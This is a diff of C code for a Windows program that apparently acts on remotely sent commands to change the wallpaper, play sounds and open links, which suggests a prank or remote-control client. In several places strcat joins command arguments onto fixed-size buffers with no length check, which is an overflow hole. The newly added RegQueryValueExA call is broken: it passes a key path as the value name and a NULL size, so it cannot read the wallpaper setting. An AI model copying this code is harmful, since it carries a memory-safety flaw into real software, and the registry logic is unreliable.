@@ -7,8 +7,9 @@ void changeWallpaper(const char *img) {
         return;
     }
 
-    char path[MAX_PATH] = "res\\";
+    char path[CMD_ARGSZ] = "res\\";
     strcat(path, img);
+    strcat(path, ".png");
 
     if(SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE))
         JBlogErr("Could not change wallpaper");
@@ -46,7 +47,7 @@ void openLink(const char *site) {
 
 
 const char *PCName;
-static char wallpaper[MAX_PATH] = BADPATH;
+static byte wallpaper[MAX_PATH] = BADPATH;
 
 void play(const char *src) {
     if (src[0] == '\0') {
@@ -56,6 +57,7 @@ void play(const char *src) {
     
     char path[CMD_ARGSZ] = "res\\";
     strcat(path, src);
+    strcat(path, ".wav");
 
     if(!PlaySoundA(path, NULL, SND_FILENAME | SND_ASYNC)) 
         JBlogErr("Could not play audio");
@@ -153,7 +155,7 @@ void execCommand(JBCMD cmd)
         changeWallpaper(cmd.args);
         break;
     case JB_SAVEWALL:
-        memcpy(wallpaper, cmd.args, CMD_ARGSZ > MAX_PATH ? MAX_PATH : CMD_ARGSZ);   // Use the smaller value, 256 < 260 then use 256, 512 > 260 then use 260
+        RegQueryValueExA(HKEY_CURRENT_USER, "\\Control Panel\\Desktop", NULL, NULL, wallpaper, NULL);
         break;
     case JB_LOADWALL:
         if (!strcmp(wallpaper, BADPATH)) {
